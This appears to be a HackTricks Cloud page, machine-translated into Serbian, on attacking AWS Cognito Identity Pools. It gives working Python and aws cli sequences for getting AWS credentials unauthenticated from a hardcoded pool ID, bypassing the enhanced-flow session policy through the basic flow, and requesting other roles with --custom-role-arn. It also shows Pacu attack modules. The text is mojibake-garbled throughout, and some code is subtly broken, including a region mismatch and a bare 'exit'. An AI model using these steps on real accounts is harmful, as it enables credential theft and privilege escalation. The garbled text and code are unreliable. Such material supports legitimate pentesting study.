# Cognito Identity Pools

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Identity pool-ovi imaju kljuÄnu ulogu omoguÄ‡avanjem vaÅ¡im korisnicima da **dobiju privremene akreditive**. Ovi akreditive su neophodni za pristup razliÄitim AWS uslugama, ukljuÄujuÄ‡i, ali ne ograniÄavajuÄ‡i se na Amazon S3 i DynamoDB. ZnaÄajna karakteristika identity pool-ova je podrÅ¡ka kako za anonimne gost korisnike, tako i za razne provajdere identiteta za autentifikaciju korisnika. PodrÅ¾ani provajderi identiteta ukljuÄuju:

- Amazon Cognito korisniÄke pool-ove
- Opcije za prijavu putem druÅ¡tvenih mreÅ¾a kao Å¡to su Facebook, Google, Login with Amazon i Sign in with Apple
- Provajdere koji su u skladu sa OpenID Connect (OIDC) standardom
- SAML (Security Assertion Markup Language) provajdere identiteta
- Identitete autentifikovane od strane razvojnog tima
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Da biste generisali sesije identifikacionog bazena, prvo morate **generisati ID identiteta**. Ovaj ID identiteta je **identifikacija sesije tog korisnika**. Ove identifikacije mogu imati do 20 skupova podataka koji mogu skladiÅ¡titi do 1MB parova kljuÄ-vrednost.

Ovo je **korisno za Äuvanje informacija o korisniku** (koji Ä‡e uvek koristiti isti ID identiteta).

Osim toga, usluga **cognito-sync** je usluga koja omoguÄ‡ava **upravljanje i sinhronizaciju ovih informacija** (u skupovima podataka, slanje informacija u tokove i SNS poruke...).

### Alati za pentestiranje

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS okvir za eksploataciju, sada ukljuÄuje module "cognito\_\_enum" i "cognito\_\_attack" koji automatizuju enumeraciju svih Cognito resursa u nalogu i oznaÄavaju slabe konfiguracije, korisniÄke atribute koji se koriste za kontrolu pristupa, itd., i takoÄ‘e automatizuju kreiranje korisnika (ukljuÄujuÄ‡i podrÅ¡ku za MFA) i eskalaciju privilegija na osnovu izmenjivih prilagoÄ‘enih atributa, upotrebljivih akreditiva bazena identiteta, uloga koje se mogu pretpostaviti u ID tokenima, itd.

Za opis funkcija modula pogledajte deo 2 [blog posta](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Za uputstva za instalaciju pogledajte glavnu [Pacu](https://github.com/RhinoSecurityLabs/pacu) stranicu.

#### Upotreba

Primer upotrebe cognito\_\_attack za pokuÅ¡aj kreiranja korisnika i svih vektora eskalacije privilegija protiv datog bazena identiteta i klijenta bazena korisnika:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Primer upotrebe cognito\_\_enum alata za prikupljanje svih korisniÄkih bazena, klijenata korisniÄkih bazena, identifikacionih bazena, korisnika, itd. vidljivih u trenutnom AWS nalogu:

```plaintext
cognito__enum --all
```

Ovom komandom se izvrÅ¡ava alat cognito\_\_enum sa opcijom --all kako bi se prikupili svi podaci o korisniÄkim bazenima, klijentima korisniÄkih bazena, identifikacionim bazenima, korisnicima, itd. koji su vidljivi u trenutnom AWS nalogu.
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) je CLI alatka napisana u Pythonu koja implementira razliÄite napade na Cognito, ukljuÄujuÄ‡i neÅ¾eljeno kreiranje naloga i eskalaciju identiteta baziranih na bazama podataka. 

#### Instalacija
```bash
$ pip install cognito-scanner
```
#### Upotreba
```bash
$ cognito-scanner --help
```
Za viÅ¡e informacija posetite https://github.com/padok-team/cognito-scanner

## Pristupanje IAM ulogama

### Neautentifikovano

Jedino Å¡to napadaÄ treba da zna da bi dobio AWS akreditive u Cognito aplikaciji kao neautentifikovani korisnik je **Identity Pool ID**, i ovaj **ID mora biti hardkodiran** u veb/mobilnoj **aplikaciji** kako bi je koristila. ID izgleda ovako: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (ne moÅ¾e se probiti metodom isprobavanja).

{% hint style="success" %}
**IAM Cognito neautentifikovana uloga koja je kreirana putem** se podrazumevano naziva `Cognito_<Identity Pool ime>Unauth_Role`
{% endhint %}

Ako pronaÄ‘ete hardkodirani Identity Pool ID koji dozvoljava neautentifikovane korisnike, moÅ¾ete dobiti AWS akreditive sa:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ili moÅ¾ete koristiti sledeÄ‡e **aws cli komande**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Imajte na umu da podrazumevano neautentifikovani cognito **korisnik NE MOÅ½E imati nikakva ovlaÅ¡Ä‡enja, Äak i ako su mu dodeljena putem politike**. Proverite sledeÄ‡i odeljak.
{% endhint %}

### UnapreÄ‘eni vs Osnovni tok autentifikacije

Prethodni odeljak pratio je **podrazumevani unapreÄ‘eni tok autentifikacije**. Ovaj tok postavlja **restriktivnu** [**politiku sesije**](../../aws-basic-information/#session-policies) za generisanu IAM ulogu sesije. Ova politika Ä‡e dozvoliti sesiji da [**koristi usluge sa ove liste**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (Äak i ako je uloga imala pristup drugim uslugama).

MeÄ‘utim, postoji naÄin da se to zaobiÄ‘e, ako je **Identity pool omoguÄ‡io "Osnovni (KlasiÄni) tok"**, korisnik Ä‡e moÄ‡i da dobije sesiju koristeÄ‡i taj tok koji **neÄ‡e imati tu restriktivnu politiku sesije**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Ako dobijete ovu **greÅ¡ku**, to je zato Å¡to **osnovni tok nije omoguÄ‡en (podrazumevano)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

ImajuÄ‡i set IAM akreditacija, trebali biste proveriti [koji pristup imate](../../#whoami) i pokuÅ¡ati [poveÄ‡ati privilegije](../../aws-privilege-escalation/).

### Autentifikovano

{% hint style="info" %}
Zapamtite da Ä‡e **autentifikovanim korisnicima** verovatno biti dodeljene **razliÄite dozvole**, pa ako moÅ¾ete **registrovati se unutar aplikacije**, pokuÅ¡ajte to da uradite i dobijte nove akreditacije.
{% endhint %}

TakoÄ‘e mogu postojati **uloge** dostupne za **autentifikovane korisnike koji pristupaju bazenu identiteta**.

Za ovo moÅ¾da Ä‡ete morati imati pristup **provajderu identiteta**. Ako je to **Cognito korisniÄki bazen**, moÅ¾da moÅ¾ete zloupotrebiti podrazumevano ponaÅ¡anje i **samostalno kreirati novog korisnika**.

{% hint style="success" %}
**IAM Cognito autentifikovana uloga koja je kreirana putem** podrazumevano se zove `Cognito_<ime bazena identiteta>Auth_Role`
{% endhint %}

U svakom sluÄaju, **sledeÄ‡i primer** oÄekuje da ste veÄ‡ prijavljeni unutar **Cognito korisniÄkog bazena** koji se koristi za pristup bazenu identiteta (ne zaboravite da se mogu konfigurisati i druge vrste provajdera identiteta).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Dobijte identity_id iz prethodnog odgovora komande
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# U IdToken-u moÅ¾ete pronaÄ‡i uloge kojima korisnik ima pristup zbog grupa korisniÄkog bazena
# Koristite --custom-role-arn da biste dobili akreditacije za odreÄ‘enu ulogu
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
MoguÄ‡e je **konfigurisati razliÄite IAM uloge u zavisnosti od provajdera identiteta** s kojim se korisnik prijavljuje ili Äak samo **od korisnika** (koristeÄ‡i tvrdnje). Stoga, ako imate pristup razliÄitim korisnicima putem istog ili razliÄitih provajdera, moÅ¾e biti **vredno prijaviti se i pristupiti IAM ulogama svih njih**.
{% endhint %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
